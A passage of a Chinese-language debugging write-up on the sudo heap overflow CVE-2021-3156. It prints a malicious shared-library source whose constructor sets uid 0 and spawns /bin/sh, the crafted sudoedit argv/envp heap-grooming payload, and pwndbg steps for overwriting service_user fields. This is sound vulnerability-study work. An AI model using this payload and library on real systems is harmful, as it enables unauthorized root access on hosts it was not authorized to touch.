ub20@Brinmon:~/FuzzCVEInit/sudo_fuzz/NWEPOC$ python3 /home/ub20/FuzzCVEInit/sudo_fuzz/NWEPOC/chunk.py finial.log
Function             Count   Min   Max     Avg  Unknown Ops
sudo_conf_read_v1      358    32  4112 127.6          2 malloc:356,realloc:2
  Size distribution:
       32 bytes : 76 times
       64 bytes : 24 times
       80 bytes : 2 times
      128 bytes : 250 times
      528 bytes : 2 times
     4112 bytes : 2 times
get_user_info          101    32  4112 198.5          2 realloc:2,malloc:97,calloc:2
  Size distribution:
       32 bytes : 20 times
       48 bytes : 24 times
       64 bytes : 4 times
       80 bytes : 19 times
       96 bytes : 1 times
      128 bytes : 24 times
      528 bytes : 3 times
     1040 bytes : 1 times
     2064 bytes : 1 times
     4112 bytes : 2 times
```

最后成功构造完成堆结构布局后，通过vuln chunk溢出掉chunk 7 的service\_user的内容从而达到提权的目的！

## 开始基于POC进行调试分析

详细的POC就不展示了源码可以直接去下载：[CVE-2021-3156/exp at main · chenaotian/CVE-2021-3156](https://github.com/chenaotian/CVE-2021-3156/tree/main/exp)

伪造的so库，这里直接用attribute宏编译的函数会在二进制文件被加载的时候自动执行，也就是通过构造函数进行提权！

```
//libc.c
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static void __attribute__ ((constructor)) _init(void);

static void _init(void) {
        printf("[+] bl1ng bl1ng! We got it!
");
#ifndef BRUTE
        setuid(0); seteuid(0); setgid(0); setegid(0);
        static char *a_argv[] = { "sh", NULL };
        static char *a_envp[] = { "PATH=/bin:/usr/bin:/sbin", NULL };
        execv("/bin/sh", a_argv);
#endif
}
```

接下来就是分析输入的payload进行动态调试了！

```
ub20@Brinmon:~/FuzzCVEInit/sudo_fuzz$ ./poc_value 
x=11, y=121, len=1529, envoff=133
------ argv ------
argv[0]: sudoedit
argv[1]: -s
argv[2]: \
... #都是\
argv[12]: \
argv[13]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
argv[14]: \
------ envp ------
envp[0]: \
...  #都是\
envp[132]: \
envp[133]: X/test                    
envp[134]: LC_IDENTIFICATION=C.UTF-8@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
envp[135]: LC_MEASUREMENT=C.UTF-8@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
envp[136]: LC_TELEPHONE=C.UTF-8@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
envp[137]: LC_ADDRESS=C.UTF-8@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
envp[138]: LC_NAME=xxxxxxxxxxxxxxxxxxxxx
```

开始解析payload，我们由于需要申请一个0xa0大小的堆块，由于argv和envp的存放是通过\x00来隔离的，当再argv结尾添加'`\`'后，由于该漏洞的拷贝逻辑会将后面的环境变量也作为拷贝的内容进行拷贝实现堆溢出，拷贝到“X/test”接着，这个X/test正好可以覆盖调service\_user->name字段为“X/test” 从而可以加载自定义的恶意so文件从而实现提权！

介绍一下环境变量的作用：

```
envp[134]: LC_IDENTIFICATION=C.UTF-8@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  #构造一个0x40的chunk
envp[135]: LC_MEASUREMENT=C.UTF-8@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA     #构造一个0x40的chunk
envp[136]: LC_TELEPHONE=C.UTF-8@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  #构造一个0xa0的chunk
envp[137]: LC_ADDRESS=C.UTF-8@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA #构造一个0x40的chunk
envp[138]: LC_NAME=xxxxxxxxxxxxxxxxxxxxx  #构造一个错误内容的环境确保前面分配的堆块会被free
```

梳理一下整个POC的利用过程：  
使用setlocale构造出4个空闲的chunkA，chunkB，chunkC，chunkD，当get\_user\_info()初始化service\_user结构体的时候会将，chunkA，chunkB，chunkD前面三个空闲的chunk申请出来,留下chunkC 不被申请，然后运行到漏洞函数，通过构造命令行参数的长度，成功将chunkC堆块申请出来，从而使的可以出堆块位于可覆盖提权的堆块上方，最后利用程序的堆溢出漏洞覆盖service\_user->library->lib\_handle字段为NULL，成功实现加载恶意so文件实现提权！

```
main()
|- setlocale(LC_ALL, '')     //构造特定空闲堆块           
...
|-  get_user_info()          //构造的堆块被用来存储重要结构体
|	|- nss_load_library()  
....
|- set_cmd()                //再次申请出构造的堆块，并且使用一处漏洞成功覆盖堆上的重要结构体
....
|- sudo_file_lookup()                 
|      |- nss_load_library()    //由于结构体被修改，导致加载恶意so文件，实现提权！
```

下面使我们构造的命令行参数和环境变量，他们的存储是在一片连续的空间通过\x00隔开  
![](images/20250429113501-eec35170-24aa-1.png)

在第一次进入\_nl\_find\_locale函数的时候，就会通过genenv来获取`LC_*`环境变量的具体值，查看环境变量是否起效  
![](images/20250429113341-bf03dde4-24aa-1.png)

下面开始调试\_nl\_make\_l10nflist函数的内部，可以发现他是如何构造一个指定大小的堆块！  
![](images/20250429113357-c890ca25-24aa-1.png)

```
envp[134]: LC_IDENTIFICATION=C.UTF-8@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
envp[135]: LC_MEASUREMENT=C.UTF-8@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
envp[136]: LC_TELEPHONE=C.UTF-8@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
envp[137]: LC_ADDRESS=C.UTF-8@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
envp[138]: LC_NAME=xxxxxxxxxxxxxxxxxxxxx
```

环境变量的值是：C.UTF-8@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

观察环境变量完毕后直接finish完成setlocale函数的运行，查看bins，可以发现进行构造出来的空闲堆块！  
![](images/20250429113417-d475bd9c-24aa-1.png)

查看一下构造的空闲堆块的空间布局：  
![](images/20250429113506-f17797c5-24aa-1.png)

可以通过这个字符串指令快速搜索到要覆盖的目标堆块地址！

```
pwndbg> search -s compat [heap]
```

![](images/20250429113507-f249f7eb-24aa-1.png)

调试到目标位置，找到要进行覆盖的结构体：  
![](images/20250429113509-f32d8fb4-24aa-1.png)

成功实现覆盖替换name字段和将handle置为NULL！  
![](images/20250429113510-f3ce1430-24aa-1.png)  
这里的service\_user-》know的值是在被堆溢出覆盖为0后重新赋值的！最后成功拼接出恶意so文件的路径进行加载提权！  
![](images/20250429113511-f4570932-24aa-1.png)
